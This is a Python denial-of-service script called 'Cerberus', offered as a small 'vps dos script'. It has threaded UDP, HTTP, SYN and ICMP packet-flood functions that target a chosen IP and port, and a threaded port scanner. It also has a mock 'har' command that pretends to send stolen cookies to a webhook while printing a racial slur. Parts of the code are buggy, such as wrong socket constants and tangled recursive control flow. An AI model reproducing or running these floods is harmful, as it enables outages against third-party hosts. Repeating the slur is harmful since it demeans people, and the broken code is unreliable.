#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
from time import sleep



sys.stdout.write("\x1b]2; C3RB3RUS\x07")
def modifications():
	print ("this is an open source perl script please do not pay for this!!")
	print ("A vps is requrired to use this preferably one with more than 5 gigs of bandwith")
	on_enter = input("press enter if you wish to exit")
	exit()

#column:65
method = """[\033[91mケルベロス\033[00m] \033[91m (currently only UDP and HTTP attacks sorry!!)
UDP  <IP> <PORT> <TIMEOUT> <PACKET SIZE>
HTTP <IP> <PORT> <TIMEOUT> <PACKET SIZE>
"""

version = "1.0 First release"

info = "I do plan on building a bigger botnet for now its just a little vps dos script"

help = "type tools to list all the tools this script offers or methods to see the methods!"

utility = """\033[91m UTILITY\033
\033 abortmission | this will stop anything running in the script\033
\033 missions | this shows anything running on the script\033
\033 ping <IP> | will ping the ip or host provided\033
\033 domain <HOST NAME> | basically finds the hosts ip address like google for example\033
\033 scan <IP> | scans an ip for any open ports\033
"""

altbanner = """\033[1;00m
                                       
 ▄████▄  ▓█████  ▄▄▄▄   ▓█████  ██▀███   █    ██   ██████ 
▒██▀ ▀█  ▓█   ▀ ▓█████▄ ▓█   ▀ ▓██ ▒ ██▒ ██  ▓██▒▒██    ▒ 
▒▓█    ▄ ▒███   ▒██▒ ▄██▒███   ▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄   
▒▓▓▄ ▄██▒▒▓█  ▄ ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  ▓▓█  ░██░  ▒   ██▒
▒ ▓███▀ ░░▒████▒░▓█  ▀█▓░▒████▒░██▓ ▒██▒▒▒█████▓ ▒██████▒▒
░ ░▒ ▒  ░░░ ▒░ ░░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
  ░  ▒    ░ ░  ░▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░
░           ░    ░    ░    ░     ░░   ░  ░░░ ░ ░ ░  ░  ░  
░ ░         ░  ░ ░         ░  ░   ░        ░           ░  
░                     ░                                   
        \033[1;91mThe dead shall not leave\033[00m
"""
banner = """
 ▄▄▄▄   ▓█████ ▄▄▄       ███▄ ▄███▓▓█████ ▓█████▄ 
▓█████▄ ▓█   ▀▒████▄    ▓██▒▀█▀ ██▒▓█   ▀ ▒██▀ ██▌
▒██▒ ▄██▒███  ▒██  ▀█▄  ▓██    ▓██░▒███   ░██   █▌
▒██░█▀  ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██ ▒▓█  ▄ ░▓█▄   ▌
░▓█  ▀█▓░▒████▒▓█   ▓██▒▒██▒   ░██▒░▒████▒░▒████▓ 
░▒▓███▀▒░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░ ░ ▒▒▓  ▒ 
▒░▒   ░  ░ ░  ░ ▒   ▒▒ ░░  ░      ░ ░ ░  ░ ░ ▒  ▒ 
 ░    ░    ░    ░   ▒   ░      ░      ░    ░ ░  ░ 
 ░         ░  ░     ░  ░       ░      ░  ░   ░    
      ░                                    ░      
"""
cookie = open(".cerberus_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True


def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global http
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1


def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global http


while True:
		sys.stdout.write("\x1b]2;Cerberus\x07")
		print (altbanner)
		sin = input("\033[1;00m[\033[91mguarding the gates of hell\033[1;00m]-\033[91m<3\033[00m ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			main()
		elif sinput == "help":
			print (help)
			main()
		elif sinput == "":
			main()
		elif sinput == "exit":
			exit()
		elif sinput == "version":
			print ("script version: "+version+" ")
		elif sinput == "methods":
			print (method)
			main()
		elif sinput == "utility":
			print (utility)
			main()
		elif sinput == "har":
			print ("[\033[91mケルベロス\033[00m] Sending Cookie Recived From Har to your webhook!".format(sinput))
			sleep(3)
			print("[                                       ]")
			sleep(3)
			print("[=========                              ]")
			sleep(3)
			print("[====================                   ]")
			sleep(3)
			print("[================================       ]")
			sleep(3)
			print("[=======================================]")
			sleep(3)
			print("[=============COOKIE SENT===============]")
			sleep(1)
			print("[=============GET NIGGERD===============]")
			sleep(1)
			print("[=============GET NIGGERD===============]")
			sleep(1)
			print("[=============GET NIGGERD===============]")
			sleep(1)
			print("[=============GET NIGGERD===============]")
			print (banner)
			sleep(5)
			os.system("clear")
		elif sinput == "scan":
			port_range = int(sin.split(" ")[2])
			pscans += 1
			def scan(port, ip):
				try:
					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					sock.connect((ip, port))
					print ("[\033[91mケルベロス\033[00m] {}\033[91m:\033[00m{} [\033[91mOPEN\033[00m]".format (ip, port))
					sock.close()
				except socket.error:
					return
				except KeyboardInterrupt:
					print ("\n")
			for port in range(1, port_range+1):
				ip = socket.gethostbyname(sin.split(" ")[1])
				threading.Thread(target=scan, args=(port, ip)).start()
		elif sinput == "info":
			print (info)
			main()

		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[91mケルベロス\033[00m] Hostname: {} \033[00m[\033[91mIP\033[00m] {}".format (host, host_ip))
			main()
		elif sinput == "ping":
			tpings += 1
			try:
				sinput, host, port = sin.split(" ")
				print ("[\033[91mケルベロス\033[00m] Pinging!: {}".format (host))
				try:
					ip = socket.gethostbyname(host)
				except socket.gaierror:
					print ("[\033[91mケルベロス\033[00m] It apears that the host is offline.")
					main()
				while True:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((host, int(port)))
						stop = int(time.time() * 1000 - start)
						sys.stdout.write("\x1b]2;CERBERUS IS WATCHING\x07".format (stop))
						print ("ケルベロス: {}:{} | Time: {}ms [\033[91mUP\033[00m]".format(ip, port, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;CERBERUS IS WATCHING\x07")
						print ("ケルベロス: {}:{} [\033[91OFFLINE\033[00m]".format(ip, port))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("[\033[91mケルベロス\033[00m] The command {} requires an argument".format (sinput))
				main()
		elif sinput == "udp":
				main()
		
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("{} has tried to escape, bringing them back now".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mケルベロス\033[00m] The command {} requires an argument".format (sinput))
					os.system("clear")
					main()
				except socket.gaierror:
					print ("[\033[91mケルベロス\033[00m] The hostname: {} invalid".format (host))
					os.system("clear")
					main()
		elif sinput == "http":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("{} has tried to escape, bringing them back now".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mケルベロス\033[00m] The command {} requires an argument".format (sinput))
				os.system("clear")
				main()
			except socket.gaierror:
				print ("[\033[91mケルベロス\033[00m] Host: {} invalid".format (host))
				os.system("clear")
				main()
		
		elif sinput == "abortmission":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Letting all UDP attacks free")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\033[91mケルベロス\033[00m] No UDP Processes running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping all icmp attacks")
				icmp = False
				while not icmp:
					print ("[\033[91mケルベロス\033[00m] No HTTP processes running")
					udp = True
					main()
		else:
			print ("[\033[91mケルベロス\033[00m] {} Not a command".format(sinput))
			sleep(3)
			os.system("clear")
			main()
		




